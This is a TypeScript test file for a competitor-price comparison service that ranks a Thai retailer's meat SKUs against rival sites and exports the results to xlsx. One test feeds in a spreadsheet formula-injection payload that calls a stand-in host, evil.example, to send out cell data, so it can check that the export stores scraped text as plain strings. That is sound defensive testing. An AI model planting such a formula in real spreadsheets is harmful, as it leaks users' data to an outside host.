import { CompetitorPricesService, catalogFingerprint as fingerprintOf } from './competitor-prices.service';
import { toInventoryShape } from './catalog-shape';

// Ported from josh competitor-overview.spec.ts (origin/main 8a44dd00): fixtures are commerce's catalog copy.
const catalogFingerprint = (p: any) => fingerprintOf(toInventoryShape(p));

const product = (sku: string, price: number) => ({ id: sku, sku, status: 'active', sellingUnit: 'KG', sellingUnitPrice: String(price),
  translations: [{ language_code: 'th', product_name: `สินค้า ${sku}` }], categoryNameTh: 'เนื้อสัตว์', categoryNameEn: 'Meat', removedAt: null }) as any;
const pair = (id: string, p: any, site: string, packPrice: number | null, ready = true) => ({
  id, revision: 1, productId: p.id, product: p, ourWeightKg: 1, sourceUrl: `https://${site}/p/${id}`, scrapingSource: null,
  competitorName: `คู่แข่ง ${id}`, competitorSku: '', competitorWeightKg: 1, sourceContext: 'public', vatIncluded: ready, collectionAllowed: true,
  autoRefresh: false, verifiedFingerprint: ready ? catalogFingerprint(p) : null, verifiedBy: 'u', verifiedAt: new Date(), matchNote: '',
  priceIncVat: packPrice, observedAt: new Date(), captureMethod: 'manual', capturedSourceVersion: null, lastError: null }) as any;

it('overview keeps one row per SKU with the cheapest ready competitor, and exports the same rows to xlsx', async () => {
  const chicken = product('CHK', 100), beef = product('BEEF', 500), salmon = product('SAL', 630);
  const rows: any[] = [pair('a', chicken, 'www.makro.pro', 95), pair('b', chicken, 'www.lotuss.com', 90), pair('c', chicken, 'www.bigc.co.th', 50, false),
    pair('d', beef, 'www.makro.pro', 550), pair('e', salmon, 'www.makro.pro', null)];
  const service = new CompetitorPricesService({ find: async () => rows } as any, { findBy: async () => [] } as any, null as any, { listSources: async () => [] } as any);
  const result = await service.overview();
  expect(result.rows.map(r => [r.sku, r.position, r.cheapest?.sourceName ?? null, r.differencePerKgIncVat])).toEqual([
    ['CHK', 'we_pricier', 'www.lotuss.com', -10], // unverified ฿50 at Big C must not count
    ['BEEF', 'we_cheaper', 'Makro PRO', 50],
    ['SAL', 'no_data', null, null],
  ]);
  expect(result.rows[0]).toMatchObject({ readyPairs: 2, pendingPairs: 1, category: 'เนื้อสัตว์', differencePercent: -11.11 });
  expect(result.rows[0].verdict).toBe('เราแพงกว่า www.lotuss.com 11.11% · เรา ฿100/กก. vs ฿90/กก.');
  expect(result.rows[2].verdict).toBe('ยังเทียบไม่ได้ — ยังไม่มีราคาคู่แข่ง');
  // Every site, cheapest comparable first, each saying how far it is from us.
  expect(result.rows[0].comparisons.map(c => [c.sourceName, c.verdict, c.summary])).toEqual([
    ['www.lotuss.com', 'เราแพงกว่า 11.11% (+฿10/กก.)', '฿90 ต่อแพ็ค 1 กก. = ฿90/กก.'],
    ['Makro PRO', 'เราแพงกว่า 5.26% (+฿5/กก.)', '฿95 ต่อแพ็ค 1 กก. = ฿95/กก.'],
    ['Big C', 'ยังเทียบไม่ได้ — รอตรวจและยืนยันคู่สินค้า', '฿50 ต่อแพ็ค 1 กก. = ฿50/กก.'],
  ]);
  expect(result.rows[1].comparisons[0].verdict).toBe('เราถูกกว่า 9.09% (฿50/กก.)');
  expect(result.rows[0].cheapest?.summary).toBe('฿90 ต่อแพ็ค 1 กก. = ฿90/กก.');
  expect(result.totals).toEqual({ skus: 3, weCheaper: 1, wePricier: 1, same: 0, noData: 1, unmatched: 0 });
  expect((await service.overview({ site: 'www.lotuss.com' })).rows.map(r => r.sku)).toEqual(['CHK']);

  const ExcelJS = require('exceljs');
  const workbook = new ExcelJS.Workbook();
  await workbook.xlsx.load(await service.overviewXlsx({ position: 'we_pricier' }));
  const summary = workbook.getWorksheet('สรุปราย SKU');
  expect(summary.rowCount).toBe(2);
  expect(summary.getRow(2).getCell(1).value).toBe('CHK');
  const column = (header: string) => (summary.getRow(1).values as unknown[]).indexOf(header);
  expect(summary.getRow(2).getCell(column('สถานะ')).value).toBe('เราแพงกว่า');
  expect(summary.getRow(2).getCell(column('สรุปผลเทียบ')).value).toBe('เราแพงกว่า www.lotuss.com 11.11% · เรา ฿100/กก. vs ฿90/กก.');
  expect(summary.getRow(2).getCell(column('ประเภทราคา')).value).toBe('Fixed');
  expect(workbook.getWorksheet('ทุกคู่เทียบ').rowCount).toBe(4);
});

it('keeps member (logged-in) prices out of the public position and reports them separately', async () => {
  const pork = product('PORK', 200);
  const memberSource = { id: 's1', name: 'Club Shop', loginUsername: 'buyer@josh', config: { mode: 'html', itemSelector: '', fields: [], currency: 'THB', vatIncluded: true,
    priceContext: 'member', collectionAllowed: true, selectedFields: undefined } };
  const memberPair = { ...pair('m', pork, 'club.example', 150), scrapingSource: memberSource };
  const { scrapingVersion } = require('../../platform/scraping/infrastructure/public-web.reader');
  const { createHash } = require('node:crypto');
  memberPair.verifiedFingerprint = createHash('sha256').update(catalogFingerprint(pork) + scrapingVersion(memberSource.config)).digest('hex');
  const service = new CompetitorPricesService({ find: async () => [pair('p', pork, 'www.makro.pro', 220), memberPair] } as any, { findBy: async () => [] } as any, null as any, { listSources: async () => [] } as any);
  const [row] = (await service.overview()).rows;
  expect(row.position).toBe('we_cheaper'); // public ฿220 vs ours ฿200, the member ฿150 must not flip it
  expect(row.cheapest?.sourceName).toBe('Makro PRO');
  expect(row.cheapestMember).toMatchObject({ sourceName: 'Club Shop', pricePerKgIncVat: 150, differencePercent: -33.33 });
  expect(row.pairs.find(p => p.id === 'm')?.priceBasis).toBe('member');
});

it('writes scraped text as plain text cells, never formulas (no spreadsheet formula injection)', async () => {
  const p = product('EVIL', 100);
  const hostile = { ...pair('x', p, 'www.makro.pro', 90), competitorName: '=HYPERLINK("https://evil.example/?d="&A1,"click")' };
  const service = new CompetitorPricesService({ find: async () => [hostile] } as any, { findBy: async () => [] } as any, null as any, { listSources: async () => [] } as any);
  const JSZip = require('jszip');
  const zip = await JSZip.loadAsync(await service.overviewXlsx());
  for (const name of Object.keys(zip.files).filter(n => /^xl\/worksheets\/sheet\d+\.xml$/.test(n))) {
    expect(await zip.file(name).async('string')).not.toMatch(/<f[ >]/);
  }
  expect(await zip.file('xl/sharedStrings.xml').async('string')).toContain('=HYPERLINK'); // kept verbatim, as text
});


it('lists every active SKU — unmatched ones last — with a site column for each configured site, paged by 50', async () => {
  const chicken = product('CHK', 100);
  const lonely = Array.from({ length: 60 }, (_, i) => product(`Z${String(i).padStart(2, '0')}`, 80));
  const service = new CompetitorPricesService({ find: async () => [pair('a', chicken, 'www.makro.pro', 95)] } as any,
    { findBy: async () => [chicken, ...lonely] } as any, null as any, { listSources: async () => [{ name: 'Gourmet Market' }] } as any);
  const first = await service.overview({ page: 1 });
  expect(first).toMatchObject({ total: 61, page: 1, pageSize: 50, sites: ['Gourmet Market', 'Makro PRO'] });
  expect(first.rows).toHaveLength(50);
  expect(first.rows[0].sku).toBe('CHK');
  expect(first.rows[1]).toMatchObject({ sku: 'Z00', position: 'unmatched', verdict: 'ยังไม่ได้จับคู่กับเว็บคู่แข่ง', ourPricePerKgIncVat: 80, comparisons: [] });
  expect((await service.overview({ page: 2 })).rows).toHaveLength(11);
  const unmatched = await service.overview({ position: 'unmatched' });
  expect(unmatched.total).toBe(60);
  expect(unmatched.totals).toMatchObject({ skus: 61, wePricier: 1, unmatched: 60 }); // tab counts ignore the selected tab
});
